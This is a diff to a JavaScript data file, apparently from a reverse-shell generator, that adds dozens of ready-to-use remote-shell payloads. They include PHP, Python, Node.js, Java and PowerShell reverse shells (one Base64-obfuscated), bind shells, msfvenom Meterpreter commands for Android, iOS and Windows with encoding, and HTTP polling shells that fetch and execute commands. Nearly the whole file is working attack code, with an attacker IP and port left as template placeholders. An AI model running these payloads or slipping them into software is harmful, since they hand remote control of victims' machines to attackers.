@@ -1,4 +1,3 @@
-
 const CommandType = {
     'ReverseShell': 'ReverseShell',
     'BindShell': 'BindShell',
@@ -185,6 +184,11 @@ const reverseShellCommands = withCommandType(
             "name": "PHP system",
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
             "meta": ["linux", "windows", "mac"]
+        },
+	{
+            "name": "PHP Direct Bash",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
+            "meta": ["linux", "mac"]
         },
         {
             "name": "PHP passthru",
@@ -384,6 +388,91 @@ const reverseShellCommands = withCommandType(
             "name": "Crystal (code)",
             "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
             "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PowerShell #5 (Base64 Encoded)",
+            "command": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBpAHAAfQAiACwAewBwAG8AcgB0AH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
+            "meta": ["windows"]
+        },
+        {
+            "name": "Python3 #3 (Threaded)",
+            "command": "import socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "Node.js #3 (Async)",
+            "command": "(async function(){\n    const net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"{shell}\", []);\n    const client = new net.Socket();\n    await client.connect({port}, \"{ip}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/;\n})();",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "Java #4 (NIO)",
+            "command": "import java.nio.channels.*;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class shell {\n    public static void main(String[] args) {\n        try {\n            SocketChannel channel = SocketChannel.open();\n            channel.connect(new InetSocketAddress(\"{ip}\", {port}));\n            Process process = Runtime.getRuntime().exec(\"{shell}\");\n            Thread t1 = new Thread(() -> {\n                try {\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    while ((bytesRead = process.getInputStream().read(buffer)) != -1) {\n                        channel.write(ByteBuffer.wrap(buffer, 0, bytesRead));\n                    }\n                } catch (IOException e) {}\n            });\n            Thread t2 = new Thread(() -> {\n                try {\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    while ((bytesRead = channel.read(ByteBuffer.wrap(buffer))) != -1) {\n                        process.getOutputStream().write(buffer, 0, bytesRead);\n                        process.getOutputStream().flush();\n                    }\n                } catch (IOException e) {}\n            });\n            t1.start();\n            t2.start();\n            t1.join();\n            t2.join();\n        } catch (Exception e) {}\n    }\n}",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "PHP Direct System Shell",
+            "command": "<?php\nsystem('bash -c \\'bash -i >& /dev/tcp/{ip}/{port} 0>&1\\'');\n?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct PowerShell",
+            "command": "<?php\nsystem('powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()');\n?>",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PHP Direct CMD",
+            "command": "<?php\nsystem('cmd /c \"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (cmd /c $data 2>&1 | Out-String);$sendback2 = $sendback + \\"CMD \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"');\n?>",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PHP Direct System Shell (Short)",
+            "command": "<?php system(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (One-Liner)",
+            "command": "<?=system('bash -i >& /dev/tcp/{ip}/{port} 0>&1');?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (netcat)",
+            "command": "<?php system(\"nc -e /bin/bash {ip} {port}\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (netcat Windows)",
+            "command": "<?php system(\"nc.exe -e cmd.exe {ip} {port}\"); ?>",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PHP Direct System Shell (Python)",
+            "command": "<?php system(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{ip}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])';\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (Perl)",
+            "command": "<?php system(\"perl -e 'use Socket;$i=\\\"{ip}\\\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (exec)",
+            "command": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (passthru)",
+            "command": "<?php passthru(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (shell_exec)",
+            "command": "<?php echo shell_exec(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"); ?>",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Direct System Shell (popen)",
+            "command": "<?php\n$handle = popen(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\", \"r\");\npclose($handle);\n?>",
+            "meta": ["linux", "mac"]
         }
     ]
 );
@@ -413,6 +502,21 @@ const bindShellCommands =  withCommandType(
             "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
             "meta": ["bind", "mac", "linux"]
         },
+        {
+            "name": "Python3 Bind #2 (Threaded)",
+            "command": "python3 -c 'import socket,subprocess,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();\ndef s2p(s,p):\n    while True:\n        data=s.recv(1024).decode();\n        if len(data)>0:\n            p.stdin.write(data.encode());p.stdin.flush()\ndef p2s(s,p):\n    while True:\n        s.send(p.stdout.read(1))\np=subprocess.Popen([\"{shell}\"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);\nthreading.Thread(target=s2p,args=[c,p]).start();\nthreading.Thread(target=p2s,args=[c,p]).start()'",
+            "meta": ["bind", "mac", "linux", "windows"]
+        },
+        {
+            "name": "Node.js Bind",
+            "command": "node -e 'require(\"net\").createServer(function(c){require(\"child_process\").spawn(\"{shell}\",[],{stdio:[c,c,c]});}).listen({port})'",
+            "meta": ["bind", "mac", "linux", "windows"]
+        },
+        {
+            "name": "PHP Bind #2 (Multi-client)",
+            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,5);while(1){$cl=socket_accept($s);if(pcntl_fork()==0){while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}}}'",
+            "meta": ["bind", "mac", "linux", "windows"]
+        }
     ]
 );
 
@@ -529,6 +633,26 @@ const msfvenomCommands =  withCommandType(
             "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
             "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
         },
+        {
+            "name": "Android Meterpreter Reverse HTTPS",
+            "command": "msfvenom --platform android -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -f raw -o payload.apk",
+            "meta": ["msfvenom", "android", "meterpreter", "reverse", "https"]
+        },
+        {
+            "name": "iOS Meterpreter Reverse TCP (ARM64)",
+            "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o payload",
+            "meta": ["msfvenom", "apple_ios", "meterpreter", "reverse"]
+        },
+        {
+            "name": "Windows Meterpreter Reverse HTTPS (x64)",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+            "meta": ["msfvenom", "windows", "meterpreter", "reverse", "https"]
+        },
+        {
+            "name": "Windows Meterpreter Reverse TCP (x64) with Custom Encoder",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x64/xor_dynamic -i 3 -f exe -o reverse.exe",
+            "meta": ["msfvenom", "windows", "meterpreter", "reverse", "encoded"]
+        }
     ]
 );
 
@@ -584,6 +708,21 @@ const hoaxShellCommands =  withCommandType(
         {
             "name": "PowerShell Outfile Constr Lang Mode https",
             "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX with Custom Auth",
+            "command": "$s='{ip}:{port}';$i='custom-auth-token';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/auth -Headers @{\"X-Auth-Token\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/cmd -Headers @{\"X-Auth-Token\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/out -Method POST -Headers @{\"X-Auth-Token\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX with TLS 1.3",
+            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls13;$s='{ip}:{port}';$i='tls13-auth';$p='https://';$v=IRM -UseBasicParsing -Uri $p$s/auth -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/cmd -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/out -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "CMD cURL with Custom Headers",
+            "command": "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"X-Custom-Header: custom-token\"&&SET protocol=http://&&curl !protocol!!ip!/auth -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/cmd -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl !protocol!!ip!/out -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\" > NUL",
             "meta": ["windows"]
         }
     ]
